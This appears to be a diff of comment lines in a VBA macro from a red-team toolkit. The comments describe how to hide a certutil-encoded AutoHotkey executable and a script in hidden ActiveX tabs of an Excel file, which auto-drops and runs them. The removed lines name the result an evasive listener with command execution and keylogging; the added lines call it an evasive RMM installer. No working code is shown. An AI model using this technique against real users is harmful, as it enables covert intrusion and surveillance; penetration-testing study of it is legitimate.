@@ -11,14 +11,14 @@ End Sub
 ' Also, you will need to create two tabs you intend to hide.
 ' On each tab, add an ActiveX text box from the developer tab insert menu.
 ' Use certutil -encode to encode a valid exe for AutoHotKey64.exe and paste that into one of the ActiveX objects.
-' Paste in the AHK listener code into the other ActiveX object.
+' Paste in the AHK AutoRMM code into the other ActiveX object.
 ' Make sure the tab and object names align, by either changing the names in the xlsm doc, or in this script.
 ' Hide the tabs with the payload.
 ' The document will activate the VBA script, write the cert file to the current working directory,
-' and then change the filename to make it the AHK exe, followed by writing the AHK listener script from the other ActiveX object,
-' followed by running the AHK listener script using the AutoHotkey64.exe application.
-' The net effect will be a portable and evasive listener, you can embed within a document to establish a connection to a listener.
-' From there, code and command execution, keylogging, and file read/write should be possible along with multiple expoit modules.
+' and then change the filename to make it the AHK exe, followed by writing the AHK AutoRMM script from the other ActiveX object,
+' followed by running the AHK AutoRMM script using the AutoHotkey64.exe application.
+' The net effect will be a portable and evasive installer, you can embed within a document to launch and RMM installer.
+' Note that this approach could easily be adapted to the AutoIT scenarios as well.  
 '
 '
 ' Ethical Note - this framework and toolset is for penetration testers (red/purple team), and should not be used to break the law,
